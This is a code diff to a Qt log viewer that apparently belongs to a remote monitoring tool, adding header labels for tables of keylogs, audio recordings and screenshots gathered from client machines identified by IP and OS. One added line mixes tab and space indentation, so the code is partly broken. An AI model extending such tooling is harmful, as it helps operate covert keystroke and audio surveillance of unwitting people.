@@ -78,14 +78,17 @@ class LogViewer(QWidget, logViewerUi):
         self.logsTab.setTabText(2, _('VIEWER_AUDIO_TAB'))
         self.screenshotsTable.horizontalHeaderItem(0).setText(_('VIEWER_SCREENSHOT_PREVIEW'))
         self.screenshotsTable.horizontalHeaderItem(1).setText(_('VIEWER_SCREENSHOT_INFO'))
-        # Keylogger
-        # Audio
-        self.clientInformationGroup.setWindowTitle(_('VIEWER_CLIENT_GROUP_TITLE'))
+        self.keylogsTable.horizontalHeaderItem(0).setText(_('VIEWER_KEYLOGS_DATETIME'))
+        self.keylogsTable.horizontalHeaderItem(1).setText(_('VIEWER_KEYLOGS_INFO'))
+        self.audioTable.horizontalHeaderItem(0).setText(_('VIEWER_AUDIO_DURATION'))
+        self.audioTable.horizontalHeaderItem(1).setText(_('VIEWER_AUDIO_SPECTRUM'))
+        self.audioTable.horizontalHeaderItem(2).setText(_('VIEWER_AUDIO_DATETIME'))
+        self.clientInformationGroup.setTitle(_('VIEWER_CLIENT_GROUP_TITLE'))
         self.clientIdLabel.setText(_('VIEWER_CLIENT_ID'))
         self.clientAliasLabel.setText(_('VIEWER_CLIENT_ALIAS'))
         self.clientIpLabel.setText(_('VIEWER_CLIENT_IP'))
         self.clientOsLabel.setText(_('VIEWER_CLIENT_OS'))
-        self.downloadGroup.setWindowTitle(_('VIEWER_DOWNLOAD_GROUP_TITLE'))
+        self.downloadGroup.setTitle(_('VIEWER_DOWNLOAD_GROUP_TITLE'))
         self.ignoreViewedCheck.setText(_('VIEWER_IGNOR_VIEWED'))
         self.downloadButton.setText(_('VIEWER_DOWNLOAD'))
 
@@ -141,6 +144,8 @@ class LogViewer(QWidget, logViewerUi):
         os.startfile(current_audio_path)
 
     def download_data(self):
+
+    	tab_index = 0
 
         selected_date = self.date
 
